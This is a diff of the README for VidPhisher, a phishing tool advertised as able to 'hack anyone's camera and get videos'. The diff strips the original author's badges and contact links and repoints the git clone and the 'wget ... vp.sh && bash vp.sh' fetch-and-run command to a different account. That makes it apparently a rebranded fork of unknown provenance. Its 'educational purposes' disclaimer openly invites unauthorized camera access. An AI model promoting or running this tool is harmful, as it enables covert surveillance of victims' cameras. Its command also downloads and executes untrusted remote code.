@@ -4,18 +4,7 @@
 
 <h4 align="center"> Hack anyone's camera and get videos!</h4>
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Version-1.2-blue?style=for-the-badge&color=blue">
-   <img src="https://img.shields.io/github/stars/KasRoudra/VidPhisher?style=for-the-badge&color=magenta">
-  <img src="https://img.shields.io/github/forks/KasRoudra/VidPhisher?color=cyan&style=for-the-badge&color=purple">
-  <img src="https://img.shields.io/github/issues/KasRoudra/VidPhisher?color=red&style=for-the-badge">
-  <img src="https://img.shields.io/github/license/KasRoudra/VidPhisher?style=for-the-badge&color=blue">
-<br>
-    <img src="https://img.shields.io/badge/Author-KasRoudra-green?style=flat-square">
-    <img src="https://img.shields.io/badge/Open%20Source-Yes-orange?style=flat-square">
-    <img src="https://img.shields.io/badge/Maintained-Yes-cyan?style=flat-square">
-    <img src="https://img.shields.io/badge/Written%20In-Shell-blue?style=flat-square">
-</p>
+
 
 ### [+] Description
 
@@ -28,7 +17,7 @@ This project is now a part of [MaxPhisher](https://github.com/KasRoudra/MaxPhish
 
 ### [+] Installation
 
-- `git clone https://github.com/KasRoudra/VidPhisher`
+- `git clone https://github.com/Cyber-Caliphate16/VidPhisher`
 - `cd VidPhisher`
 
 For termux, use additional command `termux-setup-storage`
@@ -38,7 +27,7 @@ For termux, use additional command `termux-setup-storage`
 ##### Or Run Directly
 
 ```
-wget https://raw.githubusercontent.com/KasRoudra/VidPhisher/main/vp.sh && bash vp.sh
+wget https://raw.githubusercontent.com/Cyber-Caliphate16/VidPhisher/main/vp.sh && bash vp.sh
 ```
 
 ### Docker
@@ -98,13 +87,4 @@ Thanks to <a href="https://github.com/Techchipnet/camphish">Techchip</a> and <a 
 
 **_This tool is developed for educational purposes. Here it demonstrates how camera phishing works. If anybody wants to gain unauthorized access to someones camera, he/she may try out this at his/her own risk. You have your own responsibilities and you are liable to any damage or violation of laws by this tool. The author is not responsible for any misuse of VidPhisher!_**
 
-## [~] Find Me on :
-
-- [![Github](https://img.shields.io/badge/Github-KasRoudra-green?style=for-the-badge&logo=github)](https://github.com/KasRoudra)
-
-- [![Gmail](https://img.shields.io/badge/Gmail-KasRoudra-green?style=for-the-badge&logo=gmail)](mailto:kasroudrakrd@gmail.com)
-
-- [![Facebook](https://img.shields.io/badge/Facebook-KasRoudra-green?style=for-the-badge&logo=facebook)](https://facebook.com/KasRoudra)
-
-- [![Messenger](https://img.shields.io/badge/Messenger-KasRoudra-green?style=for-the-badge&logo=messenger)](https://m.me/KasRoudra)
 
